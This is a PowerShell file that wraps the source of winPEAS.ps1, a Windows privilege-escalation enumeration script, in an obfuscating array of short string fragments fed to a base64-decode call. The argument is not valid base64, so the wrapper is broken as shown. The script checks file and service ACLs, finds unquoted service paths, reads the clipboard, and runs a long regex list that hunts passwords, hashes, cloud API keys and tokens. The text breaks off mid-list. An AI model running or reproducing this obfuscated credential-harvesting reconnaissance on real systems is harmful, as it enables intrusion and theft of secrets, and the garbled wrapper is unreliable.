$e = [System.Convert]::FromBase64String('$fragments = @('<#
.SYNOPSIS
  Pow','erShell adaptation',' of WinPEAS.exe / ','WinPeas.bat
.DESCR','IPTION
  For the l','egal enumeration o','f windows based co','mputers that you e','ither own or are a','pproved to run thi','s script on
.EXAMP','LE
  # Default - n','ormal operation wi','th username/passwo','rd audit in drives','/registry
  .\winP','eas.ps1

  # Inclu','de Excel files in ','search: .xls, .xls','x, .xlsm
  .\winPe','as.ps1 -Excel

  #',' Full audit - norm','al operation with ','APIs / Keys / Toke','ns
  ## This will ','produce false posi','tives ## 
  .\winP','eas.ps1 -FullCheck',' 

  # Add Time st','amps to each comma','nd
  .\winPeas.ps1',' -TimeStamp

.NOTE','S
  Version:      ','              1.3
','  PEASS-ng Origina','l Author:   PEASS-','ng
  winPEAS.ps1 A','uthor:         @Ra','ndolphConley
  Cre','ation Date:       ','       10/4/2022
 ',' Website:         ','           https:/','/github.com/peass-','ng/PEASS-ng

  TES','TED: PoSh 5,7
  UN','TESTED: PoSh 3,4
 ',' NOT FULLY COMPATI','BLE: PoSh 2 or low','er
#>

###########','############# FUNC','TIONS ############','############

[Cmd','letBinding()]
para','m(
  [switch]$Time','Stamp,
  [switch]$','FullCheck,
  [swit','ch]$Excel
)

# Gat','her KB from all pa','tches installed
fu','nction returnHotFi','xID {
  param(
   ',' [string]$title
  ',')
  # Match on KB ','or if patch does n','ot have a KB, retu','rn end result
  if',' (($title | Select','-String -AllMatche','s -Pattern ''KB(\d{','4,6})'').Matches.Va','lue) {
    return ','(($title | Select-','String -AllMatches',' -Pattern ''KB(\d{4',',6})'').Matches.Val','ue)
  }
  elseif (','($title | Select-S','tring -NotMatch -P','attern ''KB(\d{4,6}',')'').Matches.Value)',' {
    return (($t','itle | Select-Stri','ng -NotMatch -Patt','ern ''KB(\d{4,6})'')','.Matches.Value)
  ','}
}

function Star','t-ACLCheck {
  par','am(
    $Target, $','ServiceName)
  # G','ather ACL of objec','t
  if ($null -ne ','$target) {
    try',' {
      $ACLObjec','t = Get-Acl $targe','t -ErrorAction Sil','entlyContinue
    ','}
    catch { $nul','l }
    
    # If ','Found, Evaluate Pe','rmissions
    if (','$ACLObject) { 
   ','   $Identity = @()','
      $Identity +','= "$env:COMPUTERNA','ME\$env:USERNAME"
','      if ($ACLObje','ct.Owner -like $Id','entity ) { Write-H','ost "$Identity has',' ownership of $Tar','get" -ForegroundCo','lor Red }
      # ','This should now wo','rk for any languag','e. Command runs wh','oami group, remove','s the first two li','ne of output, conv','erts from csv to o','bject, but adds "g','roup name" to the ','first column.
    ','  whoami.exe /grou','ps /fo csv | selec','t-object -skip 2 |',' ConvertFrom-Csv -','Header ''group name',''' | Select-Object ','-ExpandProperty ''g','roup name'' | ForEa','ch-Object { $Ident','ity += $_ }
      ','$IdentityFound = $','false
      foreac','h ($i in $Identity',') {
        $permi','ssion = $ACLObject','.Access | Where-Ob','ject { $_.Identity','Reference -like $i',' }
        $UserPe','rmission = ""
    ','    switch -WildCa','rd ($Permission.Fi','leSystemRights) {
','          "FullCon','trol" { 
         ','   $userPermission',' = "FullControl"
 ','           $Identi','tyFound = $true 
 ','         }
       ','   "Write*" { 
   ','         $userPerm','ission = "Write"
 ','           $Identi','tyFound = $true 
 ','         }
       ','   "Modify" { 
   ','         $userPerm','ission = "Modify"
','            $Ident','ityFound = $true 
','          }
      ','  }
        Switch',' ($permission.Regi','stryRights) {
    ','      "FullControl','" { 
            $','userPermission = "','FullControl"
     ','       $IdentityFo','und = $true 
     ','     }
        }
 ','       if ($UserPe','rmission) {
      ','    if ($ServiceNa','me) { Write-Host "','$ServiceName found',' with permissions ','issue:" -Foregroun','dColor Red }
     ','     Write-Host -F','oregroundColor red',' "Identity $($perm','ission.IdentityRef','erence) has ''$user','Permission'' perms ','for $Target"
     ','   }
      }    
 ','     # Identity Fo','und Check - If Fal','se, loop through a','nd stop at root of',' drive
      if ($','IdentityFound -eq ','$false) {
        ','if ($Target.Length',' -gt 3) {
        ','  $Target = Split-','Path $Target
     ','     Start-ACLChec','k $Target -Service','Name $ServiceName
','        }
      }
','    }
    else {
 ','     # If not foun','d, split path one ','level and Check ag','ain
      $Target ','= Split-Path $Targ','et
      Start-ACL','Check $Target $Ser','viceName
    }
  }','
}

function Unquo','tedServicePathChec','k {
  Write-Host "','Fetching the list ','of services, this ','may take a while..','."
  $services = G','et-WmiObject -Clas','s Win32_Service | ','
    Where-Object ','{ $_.PathName -ino','tmatch "`"" -and $','_.PathName -inotma','tch ":\\Windows\\"',' -and ($_.StartMod','e -eq "Auto" -or $','_.StartMode -eq "M','anual") -and ($_.S','tate -eq "Running"',' -or $_.State -eq ','"Stopped") }
  if ','($($services | Mea','sure-Object).Count',' -lt 1) {
    Writ','e-Host "No unquote','d service paths we','re found"
  }
  el','se {
    $services',' | ForEach-Object ','{
      Write-Host',' "Unquoted Service',' Path found!" -For','egroundColor red
 ','     Write-Host Na','me: $_.Name
      ','Write-Host PathNam','e: $_.PathName
   ','   Write-Host Star','tName: $_.StartNam','e 
      Write-Hos','t StartMode: $_.St','artMode
      Writ','e-Host Running: $_','.State
    } 
  }
','}

function TimeEl','apsed { 
  Write-H','ost "Time Running:',' $($stopwatch.Elap','sed.Minutes):$($st','opwatch.Elapsed.Se','conds)" 
}

functi','on Get-ClipBoardTe','xt {
  Add-Type -A','ssemblyName Presen','tationCore
  $text',' = [Windows.Clipbo','ard]::GetText()
  ','if ($text) {
    W','rite-Host ""
    i','f ($TimeStamp) { T','imeElapsed }
    W','rite-Host -Foregro','undColor Blue "===','======|| ClipBoard',' text found:"
    ','Write-Host $text
 ',' }
}

function Sea','rch-Excel {
  [cmd','letbinding()]
  Pa','ram (
      [param','eter(Mandatory, Va','lueFromPipeline)]
','      [ValidateScr','ipt({
          Tr','y {
              ','If (Test-Path -Pat','h $_) {$True}
    ','          Else {Th','row "$($_) is not ','a valid path!"}
  ','        }
        ','  Catch {
        ','      Throw $_
   ','       }
      })]','
      [string]$So','urce,
      [param','eter(Mandatory)]
 ','     [string]$Sear','chText
      #You ','can specify wildca','rd characters (*, ','?)
  )
  $Excel = ','New-Object -ComObj','ect Excel.Applicat','ion
  Try {
      ','$Source = Convert-','Path $Source
  }
 ',' Catch {
      Wri','te-Warning "Unable',' locate full path ','of $($Source)"
   ','   BREAK
  }
  $Wo','rkbook = $Excel.Wo','rkbooks.Open($Sour','ce)
  ForEach ($Wo','rksheet in @($Work','book.Sheets)) {
  ','    # Find Method ','https://msdn.micro','soft.com/en-us/vba','/excel-vba/article','s/range-find-metho','d-excel
      $Fou','nd = $WorkSheet.Ce','lls.Find($SearchTe','xt)
      If ($Fou','nd) {
        try{','  
          # Add','ress Method https:','//msdn.microsoft.c','om/en-us/vba/excel','-vba/articles/rang','e-address-property','-excel
          W','rite-Host "Pattern',': ''$SearchText'' fo','und in $source" -F','oregroundColor Blu','e
          $Begin','Address = $Found.A','ddress(0,0,1,1)
  ','        #Initial F','ound Cell
        ','  New-Object -Type','Name PSObject -Pro','perty ([Ordered]@{','
              Wor','kSheet = $Workshee','t.Name
           ','   Column = $Found','.Column
          ','    Row =$Found.Ro','w
              Te','xtMatch = $Found.T','ext
              ','Address = $BeginAd','dress
          })','
          Do {
  ','            $Found',' = $WorkSheet.Cell','s.FindNext($Found)','
              $Ad','dress = $Found.Add','ress(0,0,1,1)
    ','          If ($Add','ress -eq $BeginAdd','ress) {
          ','      Write-host "','Address is same as',' Begin Address"
  ','                BR','EAK
              ','}
              Ne','w-Object -TypeName',' PSObject -Propert','y ([Ordered]@{
   ','               Wor','kSheet = $Workshee','t.Name
           ','       Column = $F','ound.Column
      ','            Row =$','Found.Row
        ','          TextMatc','h = $Found.Text
  ','                Ad','dress = $Address
 ','             })   ','             
    ','      } Until ($Fa','lse)
        }
   ','     catch {
     ','     # Null expres','sion in Found
    ','    }
      }
    ','  #Else {
      # ','   Write-Warning "','[$($WorkSheet.Name',')] Nothing Found!"','
      #}
  }
  tr','y{
  $workbook.clo','se($False)
  [void','][System.Runtime.I','nteropServices.Mar','shal]::ReleaseComO','bject([System.__Co','mObject]$excel)
  ','[gc]::Collect()
  ','[gc]::WaitForPendi','ngFinalizers()
  }','
  catch{
    #Usu','ally an RPC error
','  }
  Remove-Varia','ble excel -ErrorAc','tion SilentlyConti','nue
}

#Get-CIMIns','tace/Get-WMIObject',' ''Win32_Product'' c','alls kick off sile','nt repairs on some',' programs causing ','potential issues a','fter/while running',' this & doesn''t al','ways return a comp','lete list.
#Allege','dly ''Win32reg_AddR','emovePrograms'' wor','ks fine now but th','is method ensures ','safety of target s','ystems.
function G','et-InstalledApplic','ations {
[cmdletbi','nding()]
param(
  ','[Parameter(DontSho','w)]
  $keys = @(''''',',''\Wow6432Node'')
)','
  foreach($key in',' $keys) {
      tr','y {
        $apps ','= [Microsoft.Win32','.RegistryKey]::Ope','nRemoteBaseKey(''Lo','calMachine'',$env:C','OMPUTERNAME).OpenS','ubKey("SOFTWARE$ke','y\Microsoft\Window','s\CurrentVersion\U','ninstall").GetSubK','eyNames()
      }
','      catch { 
   ','     Continue 
   ','   }
    foreach($','app in $apps) {
  ','      $program = [','Microsoft.Win32.Re','gistryKey]::OpenRe','moteBaseKey(''Local','Machine'',$env:COMP','UTERNAME).OpenSubK','ey("SOFTWARE$key\M','icrosoft\Windows\C','urrentVersion\Unin','stall\$app")
     ','   $name = $progra','m.GetValue(''Displa','yName'')
      if($','name) {
        Ne','w-Object -TypeName',' PSObject -Propert','y ([Ordered]@{    ','   
              ','Computername = $en','v:COMPUTERNAME
   ','           Softwar','e = $name 
       ','       Version = $','program.GetValue("','DisplayVersion")
 ','             Publi','sher = $program.Ge','tValue("Publisher"',')
              In','stallDate = $progr','am.GetValue("Insta','llDate")
         ','     UninstallStri','ng = $program.GetV','alue("UninstallStr','ing")
            ','  Architecture = $','(if($key -eq ''\wow','6432node'') {''x86''}','else{''x64''})
     ','         Path = $p','rogram.Name
      ','  })
      }
    }','
  }
}

function W','rite-Color([String','[]]$Text, [Console','Color[]]$Color) {
','  for ($i = 0; $i ','-lt $Text.Length; ','$i++) {
    Write-','Host $Text[$i] -Fo','reground $Color[$i','] -NoNewline
  }
 ',' Write-Host
}


#W','rite-Color "    ((',',.,/((((((((((((((','((((((/,  */" -Col','or Green
Write-Col','or ",/*,..*(((((((','((((((((((((((((((','((((((((," -Color ','Green
Write-Color ','",*/((((((((((((((','((((/,  .*//((//**',', .*((((((*" -Colo','r Green
Write-Colo','r "(((((((((((((((','(", "* *****,,,", ','"\########## .(* ,','((((((" -Color Gre','en, Blue, Green
Wr','ite-Color "(((((((','((((", "/*********','**********", "####','### .(. ((((((" -C','olor Green, Blue, ','Green
Write-Color ','"(((((((", "/*****','*************", "/','@@@@@/", "***", "\','#######\((((((" -C','olor Green, Blue, ','White, Blue, Green','
Write-Color ",,..','", "**************','********", "/@@@@@','@@@@/", "***", ",#','####.\/(((((" -Col','or Green, Blue, Wh','ite, Blue, Green
W','rite-Color ", ,", ','"*****************','*****", "/@@@@@+@@','@/", "*********", ','"##((/ /((((" -Col','or Green, Blue, Wh','ite, Blue, Green
W','rite-Color "..(((#','#########", "*****','****", "/#@@@@@@@@','@/", "************','*", ",,..((((" -Co','lor Green, Blue, W','hite, Blue, Green
','Write-Color ".(((#','###############(/"',', "******", "/@@@@','@/", "************','****", ".. /((" -C','olor Green, Blue, ','White, Blue, Green','
Write-Color ".((#','##################','#####(/", "*******','*****************"',', "..*(" -Color Gr','een, Blue, Green
W','rite-Color ".((###','##################','########(/", "****','****************",',' ".,(" -Color Gree','n, Blue, Green
Wri','te-Color ".((#####','##################','###########(/", "*','**************", "','..(" -Color Green,',' Blue, Green
Write','-Color ".((#######','##################','#############(/", ','"***********", "..','(" -Color Green, B','lue, Green
Write-C','olor ".((######", ','"(,.***.,(", "####','###############", ','"(..***", "(/*****','****", "..(" -Colo','r Green, Green, Gr','een, Green, Blue, ','Green
Write-Color ','".((######*", "(##','##((", "##########','#########", "((###','###", "/(********"',', "..(" -Color Gre','en, Green, Green, ','Green, Blue, Green','
Write-Color ".((#','#################"',', "(/**********(",',' "################','(**...(" -Color Gr','een, Green, Green
','Write-Color ".(((#','##################','#", "/*******(", "','##################','#.((((" -Color Gre','en, Green, Green
W','rite-Color ".(((((','##################','##################','########/  /((" -C','olor Green
Write-C','olor "..(((((#####','##################','##################','(..(((((." -Color ','Green
Write-Color ','"....(((((########','##################','###########( .((((','((." -Color Green
','Write-Color ".....','.(((((############','##################','###( .(((((((." -C','olor Green
Write-C','olor "(((((((((. ,','(#################','###########(../(((','((((((." -Color Gr','een
Write-Color " ',' (((((((((/,  ,###','#################(','/..((((((((((." -C','olor Green
Write-C','olor "        ((((','(((((/,.  ,*//////','*,. ./(((((((((((.','" -Color Green
Wri','te-Color "        ','   (((((((((((((((','((((((((((((/" -Co','lor Green
Write-Co','lor "          by ','PEASS-ng & Randolp','hConley" -Color Gr','een

#############','########### VARIAB','LES ##############','##########

# Manu','ally added Regex s','earch strings from',' https://github.co','m/peass-ng/PEASS-n','g/blob/master/buil','d_lists/sensitive_','files.yaml

# Set ','these values to tr','ue to add them to ','the regex search b','y default
$passwor','d = $true
$usernam','e = $true
$webAuth',' = $true

$regexSe','arch = @{}

if ($p','assword) {
  $rege','xSearch.add("Simpl','e Passwords1", "pa','ss.*[=:].+")
  $re','gexSearch.add("Sim','ple Passwords2", "','pwd.*[=:].+")
  $r','egexSearch.add("Ap','r1 MD5", ''\$apr1\$','[a-zA-Z0-9_/\.]{8}','\$[a-zA-Z0-9_/\.]{','22}'')
  $regexSear','ch.add("Apache SHA','", "\{SHA\}[0-9a-z','A-Z/_=]{10,}")
  $','regexSearch.add("B','lowfish", ''\$2[abx','yz]?\$[0-9]{2}\$[a','-zA-Z0-9_/\.]*'')
 ',' $regexSearch.add(','"Drupal", ''\$S\$[a','-zA-Z0-9_/\.]{52}''',')
  $regexSearch.a','dd("Joomlavbulleti','n", "[0-9a-zA-Z]{3','2}:[a-zA-Z0-9_]{16',',32}")
  $regexSea','rch.add("Linux MD5','", ''\$1\$[a-zA-Z0-','9_/\.]{8}\$[a-zA-Z','0-9_/\.]{22}'')
  $','regexSearch.add("p','hpbb3", ''\$H\$[a-z','A-Z0-9_/\.]{31}'')
','  $regexSearch.add','("sha512crypt", ''\','$6\$[a-zA-Z0-9_/\.',']{16}\$[a-zA-Z0-9_','/\.]{86}'')
  $rege','xSearch.add("Wordp','ress", ''\$P\$[a-zA','-Z0-9_/\.]{31}'')
 ',' $regexSearch.add(','"md5", "(^|[^a-zA-','Z0-9])[a-fA-F0-9]{','32}([^a-zA-Z0-9]|$',')")
  $regexSearch','.add("sha1", "(^|[','^a-zA-Z0-9])[a-fA-','F0-9]{40}([^a-zA-Z','0-9]|$)")
  $regex','Search.add("sha256','", "(^|[^a-zA-Z0-9','])[a-fA-F0-9]{64}(','[^a-zA-Z0-9]|$)")
','  $regexSearch.add','("sha512", "(^|[^a','-zA-Z0-9])[a-fA-F0','-9]{128}([^a-zA-Z0','-9]|$)")  
  # Thi','s does not work co','rrectly
  #$regexS','earch.add("Base32"',', "(?:[A-Z2-7]{8})','*(?:[A-Z2-7]{2}={6','}|[A-Z2-7]{4}={4}|','[A-Z2-7]{5}={3}|[A','-Z2-7]{7}=)?")
  $','regexSearch.add("B','ase64", "(eyJ|YTo|','Tzo|PD[89]|aHR0cHM','6L|aHR0cDo|rO0)[a-','zA-Z0-9+\/]+={0,2}','")
}

if ($usernam','e) {
  $regexSearc','h.add("Usernames1"',', "username[=:].+"',')
  $regexSearch.a','dd("Usernames2", "','user[=:].+")
  $re','gexSearch.add("Use','rnames3", "login[=',':].+")
  $regexSea','rch.add("Emails", ','"[A-Za-z0-9._%+-]+','@[A-Za-z0-9.-]+\.[','A-Za-z]{2,6}")
  $','regexSearch.add("N','et user add", "net',' user .+ /add")
}
','
if ($FullCheck) {','
  $regexSearch.ad','d("Artifactory API',' Token", "AKC[a-zA','-Z0-9]{10,}")
  $r','egexSearch.add("Ar','tifactory Password','", "AP[0-9ABCDEF][','a-zA-Z0-9]{8,}")
 ',' $regexSearch.add(','"Adafruit API Key"',', "([a-z0-9_-]{32}',')")
  $regexSearch','.add("Adafruit API',' Key", "([a-z0-9_-',']{32})")
  $regexS','earch.add("Adobe C','lient Id (Oauth We','b)", "(adobe[a-z0-','9_ \.,\-]{0,25})(=','|>|:=|\|\|:|<=|=>|',':).{0,5}[''""]([a-f','0-9]{32})[''""]")
 ',' $regexSearch.add(','"Abode Client Secr','et", "(p8e-)[a-z0-','9]{32}")
  $regexS','earch.add("Age Sec','ret Key", "AGE-SEC','RET-KEY-1[QPZRY9X8','GF2TVDW0S3JN54KHCE','6MUA7L]{58}")
  $r','egexSearch.add("Ai','rtable API Key", "','([a-z0-9]{17})")
 ',' $regexSearch.add(','"Alchemi API Key",',' "(alchemi[a-z0-9_',' \.,\-]{0,25})(=|>','|:=|\|\|:|<=|=>|:)','.{0,5}[''""]([a-zA-','Z0-9-]{32})[''""]")','
  $regexSearch.ad','d("Artifactory API',' Key & Password", ','"[""'']AKC[a-zA-Z0-','9]{10,}[""'']|[""'']','AP[0-9ABCDEF][a-zA','-Z0-9]{8,}[""'']")
','  $regexSearch.add','("Atlassian API Ke','y", "(atlassian[a-','z0-9_ \.,\-]{0,25}',')(=|>|:=|\|\|:|<=|','=>|:).{0,5}[''""]([','a-z0-9]{24})[''""]"',')
  $regexSearch.a','dd("Binance API Ke','y", "(binance[a-z0','-9_ \.,\-]{0,25})(','=|>|:=|\|\|:|<=|=>','|:).{0,5}[''""]([a-','zA-Z0-9]{64})[''""]','")
  $regexSearch.','add("Bitbucket Cli','ent Id", "((bitbuc','ket[a-z0-9_ \.,\-]','{0,25})(=|>|:=|\|\','|:|<=|=>|:).{0,5}[','''""]([a-z0-9]{32})','[''""])")
  $regexS','earch.add("Bitbuck','et Client Secret",',' "((bitbucket[a-z0','-9_ \.,\-]{0,25})(','=|>|:=|\|\|:|<=|=>','|:).{0,5}[''""]([a-','z0-9_\-]{64})[''""]',')")
  $regexSearch','.add("BitcoinAvera','ge API Key", "(bit','coin.?average[a-z0','-9_ \.,\-]{0,25})(','=|>|:=|\|\|:|<=|=>','|:).{0,5}[''""]([a-','zA-Z0-9]{43})[''""]','")
  $regexSearch.','add("Bitquery API ','Key", "(bitquery[a','-z0-9_ \.,\-]{0,25','})(=|>|:=|\|\|:|<=','|=>|:).{0,5}[''""](','[A-Za-z0-9]{32})[''','""]")
  $regexSear','ch.add("Bittrex Ac','cess Key and Acces','s Key", "([a-z0-9]','{32})")
  $regexSe','arch.add("Birise A','PI Key", "(bitrise','[a-z0-9_ \.,\-]{0,','25})(=|>|:=|\|\|:|','<=|=>|:).{0,5}[''""',']([a-zA-Z0-9_\-]{8','6})[''""]")
  $rege','xSearch.add("Block',' API Key", "(block','[a-z0-9_ \.,\-]{0,','25})(=|>|:=|\|\|:|','<=|=>|:).{0,5}[''""',']([a-z0-9]{4}-[a-z','0-9]{4}-[a-z0-9]{4','}-[a-z0-9]{4})[''""',']")
  $regexSearch','.add("Blockchain A','PI Key", "mainnet[','a-zA-Z0-9]{32}|tes','tnet[a-zA-Z0-9]{32','}|ipfs[a-zA-Z0-9]{','32}")
  $regexSear','ch.add("Blockfrost',' API Key", "(block','chain[a-z0-9_ \.,\','-]{0,25})(=|>|:=|\','|\|:|<=|=>|:).{0,5','}[''""]([a-f0-9]{8}','-[a-f0-9]{4}-[a-f0','-9]{4}-[a-f0-9]{4}','-[0-9a-f]{12})[''""',']")
  $regexSearch','.add("Box API Key"',', "(box[a-z0-9_ \.',',\-]{0,25})(=|>|:=','|\|\|:|<=|=>|:).{0',',5}[''""]([a-zA-Z0-','9]{32})[''""]")
  $','regexSearch.add("B','ravenewcoin API Ke','y", "(bravenewcoin','[a-z0-9_ \.,\-]{0,','25})(=|>|:=|\|\|:|','<=|=>|:).{0,5}[''""',']([a-z0-9]{50})[''"','"]")
  $regexSearc','h.add("Clearbit AP','I Key", "sk_[a-z0-','9]{32}")
  $regexS','earch.add("Clojars',' API Key", "(CLOJA','RS_)[a-zA-Z0-9]{60','}")
  $regexSearch','.add("Coinbase Acc','ess Token", "([a-z','0-9_-]{64})")
  $r','egexSearch.add("Co','inlayer API Key", ','"(coinlayer[a-z0-9','_ \.,\-]{0,25})(=|','>|:=|\|\|:|<=|=>|:',').{0,5}[''""]([a-z0','-9]{32})[''""]")
  ','$regexSearch.add("','Coinlib API Key", ','"(coinlib[a-z0-9_ ','\.,\-]{0,25})(=|>|',':=|\|\|:|<=|=>|:).','{0,5}[''""]([a-z0-9',']{16})[''""]")
  $r','egexSearch.add("Co','nfluent Access Tok','en & Secret Key", ','"([a-z0-9]{16})")
','  $regexSearch.add','("Contentful deliv','ery API Key", "(co','ntentful[a-z0-9_ \','.,\-]{0,25})(=|>|:','=|\|\|:|<=|=>|:).{','0,5}[''""]([a-z0-9=','_\-]{43})[''""]")
 ',' $regexSearch.add(','"Covalent API Key"',', "ckey_[a-z0-9]{2','7}")
  $regexSearc','h.add("Charity Sea','rch API Key", "(ch','arity.?search[a-z0','-9_ \.,\-]{0,25})(','=|>|:=|\|\|:|<=|=>','|:).{0,5}[''""]([a-','z0-9]{32})[''""]")
','  $regexSearch.add','("Databricks API K','ey", "dapi[a-h0-9]','{32}")
  $regexSea','rch.add("DDownload',' API Key", "(ddown','load[a-z0-9_ \.,\-',']{0,25})(=|>|:=|\|','\|:|<=|=>|:).{0,5}','[''""]([a-z0-9]{22}',')[''""]")
  $regexS','earch.add("Defined',' Networking API to','ken", "(dnkey-[a-z','0-9=_\-]{26}-[a-z0','-9=_\-]{52})")
  $','regexSearch.add("D','iscord API Key, Cl','ient ID & Client S','ecret", "((discord','[a-z0-9_ \.,\-]{0,','25})(=|>|:=|\|\|:|','<=|=>|:).{0,5}[''""',']([a-h0-9]{64}|[0-','9]{18}|[a-z0-9=_\-',']{32})[''""])")
  $','regexSearch.add("D','roneci Access Toke','n", "([a-z0-9]{32}',')")
  $regexSearch','.add("Dropbox API ','Key", "sl.[a-zA-Z0','-9_-]{136}")
  $re','gexSearch.add("Dop','pler API Key", "(d','p\.pt\.)[a-zA-Z0-9',']{43}")
  $regexSe','arch.add("Dropbox ','API secret/key, sh','ort & long lived A','PI Key", "(dropbox','[a-z0-9_ \.,\-]{0,','25})(=|>|:=|\|\|:|','<=|=>|:).{0,5}[''""',']([a-z0-9]{15}|sl\','.[a-z0-9=_\-]{135}','|[a-z0-9]{11}(AAAA','AAAAAA)[a-z0-9_=\-',']{43})[''""]")
  $r','egexSearch.add("Du','ffel API Key", "du','ffel_(test|live)_[','a-zA-Z0-9_-]{43}")','
  $regexSearch.ad','d("Dynatrace API K','ey", "dt0c01\.[a-z','A-Z0-9]{24}\.[a-z0','-9]{64}")
  $regex','Search.add("EasyPo','st API Key", "EZAK','[a-zA-Z0-9]{54}")
','  $regexSearch.add','("EasyPost test AP','I Key", "EZTK[a-zA','-Z0-9]{54}")
  $re','gexSearch.add("Eth','erscan API Key", "','(etherscan[a-z0-9_',' \.,\-]{0,25})(=|>','|:=|\|\|:|<=|=>|:)','.{0,5}[''""]([A-Z0-','9]{34})[''""]")
  $','regexSearch.add("E','tsy Access Token",',' "([a-z0-9]{24})")','
  $regexSearch.ad','d("Facebook Access',' Token", "EAACEdEo','se0cBA[0-9A-Za-z]+','")
  $regexSearch.','add("Fastly API Ke','y", "(fastly[a-z0-','9_ \.,\-]{0,25})(=','|>|:=|\|\|:|<=|=>|',':).{0,5}[''""]([a-z','0-9=_\-]{32})[''""]','")
  $regexSearch.','add("Finicity API ','Key & Client Secre','t", "(finicity[a-z','0-9_ \.,\-]{0,25})','(=|>|:=|\|\|:|<=|=','>|:).{0,5}[''""]([a','-f0-9]{32}|[a-z0-9',']{20})[''""]")
  $r','egexSearch.add("Fl','ickr Access Token"',', "([a-z0-9]{32})"',')
  $regexSearch.a','dd("Flutterweave K','eys", "FLWPUBK_TES','T-[a-hA-H0-9]{32}-','X|FLWSECK_TEST-[a-','hA-H0-9]{32}-X|FLW','SECK_TEST[a-hA-H0-','9]{12}")
  $regexS','earch.add("Frame.i','o API Key", "fio-u','-[a-zA-Z0-9_=\-]{6','4}")
  $regexSearc','h.add("Freshbooks ','Access Token", "([','a-z0-9]{64})")
  $','regexSearch.add("G','ithub", "github(.{','0,20})?[''""][0-9a-','zA-Z]{35,40}")
  $','regexSearch.add("G','ithub App Token", ','"(ghu|ghs)_[0-9a-z','A-Z]{36}")
  $rege','xSearch.add("Githu','b OAuth Access Tok','en", "gho_[0-9a-zA','-Z]{36}")
  $regex','Search.add("Github',' Personal Access T','oken", "ghp_[0-9a-','zA-Z]{36}")
  $reg','exSearch.add("Gith','ub Refresh Token",',' "ghr_[0-9a-zA-Z]{','76}")
  $regexSear','ch.add("GitHub Fin','e-Grained Personal',' Access Token", "g','ithub_pat_[0-9a-zA','-Z_]{82}")
  $rege','xSearch.add("Gitla','b Personal Access ','Token", "glpat-[0-','9a-zA-Z\-]{20}")
 ',' $regexSearch.add(','"GitLab Pipeline T','rigger Token", "gl','ptt-[0-9a-f]{40}")','
  $regexSearch.ad','d("GitLab Runner R','egistration Token"',', "GR1348941[0-9a-','zA-Z_\-]{20}")
  $','regexSearch.add("G','itter Access Token','", "([a-z0-9_-]{40','})")
  $regexSearc','h.add("GoCardless ','API Key", "live_[a','-zA-Z0-9_=\-]{40}"',')
  $regexSearch.a','dd("GoFile API Key','", "(gofile[a-z0-9','_ \.,\-]{0,25})(=|','>|:=|\|\|:|<=|=>|:',').{0,5}[''""]([a-zA','-Z0-9]{32})[''""]")','
  $regexSearch.ad','d("Google API Key"',', "AIza[0-9A-Za-z_','\-]{35}")
  $regex','Search.add("Google',' Cloud Platform AP','I Key", "(google|g','cp|youtube|drive|y','t)(.{0,20})?[''""][','AIza[0-9a-z_\-]{35','}][''""]")
  $regex','Search.add("Google',' Drive Oauth", "[0','-9]+-[0-9A-Za-z_]{','32}\.apps\.googleu','sercontent\.com")
','  $regexSearch.add','("Google Oauth Acc','ess Token", "ya29\','.[0-9A-Za-z_\-]+")','
  $regexSearch.ad','d("Google (GCP) Se','rvice-account", ""','"type.+:.+""servic','e_account")
  $reg','exSearch.add("Graf','ana API Key", "eyJ','rIjoi[a-z0-9_=\-]{','72,92}")
  $regexS','earch.add("Grafana',' cloud api token",',' "glc_[A-Za-z0-9\+','/]{32,}={0,2}")
  ','$regexSearch.add("','Grafana service ac','count token", "(gl','sa_[A-Za-z0-9]{32}','_[A-Fa-f0-9]{8})")','
  $regexSearch.ad','d("Hashicorp Terra','form user/org API ','Key", "[a-z0-9]{14','}\.atlasv1\.[a-z0-','9_=\-]{60,70}")
  ','$regexSearch.add("','Heroku API Key", "','[hH][eE][rR][oO][k','K][uU].{0,30}[0-9A','-F]{8}-[0-9A-F]{4}','-[0-9A-F]{4}-[0-9A','-F]{4}-[0-9A-F]{12','}")
  $regexSearch','.add("Hubspot API ','Key", "[''""][a-h0-','9]{8}-[a-h0-9]{4}-','[a-h0-9]{4}-[a-h0-','9]{4}-[a-h0-9]{12}','[''""]")
  $regexSe','arch.add("Instatus',' API Key", "(insta','tus[a-z0-9_ \.,\-]','{0,25})(=|>|:=|\|\','|:|<=|=>|:).{0,5}[','''""]([a-z0-9]{32})','[''""]")
  $regexSe','arch.add("Intercom',' API Key & Client ','Secret/ID", "(inte','rcom[a-z0-9_ \.,\-',']{0,25})(=|>|:=|\|','\|:|<=|=>|:).{0,5}','[''""]([a-z0-9=_]{6','0}|[a-h0-9]{8}-[a-','h0-9]{4}-[a-h0-9]{','4}-[a-h0-9]{4}-[a-','h0-9]{12})[''""]")
','  $regexSearch.add','("Ionic API Key", ','"(ionic[a-z0-9_ \.',',\-]{0,25})(=|>|:=','|\|\|:|<=|=>|:).{0',',5}[''""](ion_[a-z0','-9]{42})[''""]")
  ','$regexSearch.add("','JSON Web Token", "','(ey[0-9a-z]{30,34}','\.ey[0-9a-z\/_\-]{','30,}\.[0-9a-zA-Z\/','_\-]{10,}={0,2})")','
  $regexSearch.ad','d("Kraken Access T','oken", "([a-z0-9\/','=_\+\-]{80,90})")
','  $regexSearch.add','("Kucoin Access To','ken", "([a-f0-9]{2','4})")
  $regexSear','ch.add("Kucoin Sec','ret Key", "([0-9a-','f]{8}-[0-9a-f]{4}-','[0-9a-f]{4}-[0-9a-','f]{4}-[0-9a-f]{12}',')")
  $regexSearch','.add("Launchdarkly',' Access Token", "(','[a-z0-9=_\-]{40})"',')
  $regexSearch.a','dd("Linear API Key','", "(lin_api_[a-zA','-Z0-9]{40})")
  $r','egexSearch.add("Li','near Client Secret','/ID", "((linear[a-','z0-9_ \.,\-]{0,25}',')(=|>|:=|\|\|:|<=|','=>|:).{0,5}[''""]([','a-f0-9]{32})[''""])','")
  $regexSearch.','add("LinkedIn Clie','nt ID", "linkedin(','.{0,20})?[''""][0-9','a-z]{12}[''""]")
  ','$regexSearch.add("','LinkedIn Secret Ke','y", "linkedin(.{0,','20})?[''""][0-9a-z]','{16}[''""]")
  $reg','exSearch.add("Lob ','API Key", "((lob[a','-z0-9_ \.,\-]{0,25','})(=|>|:=|\|\|:|<=','|=>|:).{0,5}[''""](','(live|test)_[a-f0-','9]{35})[''""])|((lo','b[a-z0-9_ \.,\-]{0',',25})(=|>|:=|\|\|:','|<=|=>|:).{0,5}[''"','"]((test|live)_pub','_[a-f0-9]{31})[''""','])")
  $regexSearc','h.add("Lob Publish','able API Key", "((','test|live)_pub_[a-','f0-9]{31})")
